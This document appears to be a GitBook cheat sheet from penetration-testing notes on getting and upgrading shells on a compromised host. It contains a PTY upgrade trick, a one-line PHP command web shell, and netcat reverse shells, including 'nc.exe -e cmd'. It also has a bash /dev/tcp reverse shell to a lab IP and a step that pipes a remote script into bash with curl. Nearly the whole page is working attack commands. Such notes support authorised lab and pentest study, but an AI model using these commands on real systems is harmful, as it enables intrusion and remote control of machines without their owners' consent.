---
description: Dummy shell to fully-interactive shell upgrade
---

# 😎 Fully-Interactive Shell Upgrade

## You just popped a shell...

Python:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

If Python3 is available:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Example syntax:

```
/var/www/admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

* The shell will look exactly the same or it may appear slightly differently

However, to gain full functionality do the following:

<mark style="color:yellow;">Press CTRL+Z</mark>

```
 stty raw -echo; fg
```

* <mark style="color:yellow;">Press enter a few times after this</mark>
* <mark style="color:yellow;">export TERM=xterm-256color</mark>
* Now, you will have a fully-interactive shell
* This includes tab/auto-complete
* CTRL+C
* And more

## PHP Web Shell

1. Create web shell

```
echo '<?php system($_GET["x"]);?>' > php-cmd.php
```

&#x20; 2\. Transfer to target (i.e. FTP)

&#x20; 3\. Use Netcat to connect back to your attack machine

&#x20; 4\. Transfer the nc.exe binary if it is a Windows target

&#x20; 5\. Start Netcat listener on the attack machine

```
nc -lnvp 1337
```

&#x20; 6\. Trigger reverse shell

```
nc -v <kali_ip_here> 1337

nc.exe -v <kali_ip_here> 1337 -e cmd
```

### Web Shell -> Reverse Shell Upgrade

* I personally do not like operating in web shells because of their clunky nature
* Let's fix that
* Situation: You ALREADY have a web shell on the victim

Create file:

rev\_shell:

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.49.90/1337 0>&1
```

Start Netcat listener on Kali:

```
nc -lnvp 1337
```

Begin HTTP Server on Kali:

```
python3 -m http.server 80
```

Transfer file to the victim (I found out that you need to use curl when piping to bash):

```
curl 192.168.49.90/rev_shell | bash
```

Go back to your Netcat listener:

<figure><img src=".gitbook/assets/image (1) (1) (1) (4).png" alt=""><figcaption></figcaption></figure>
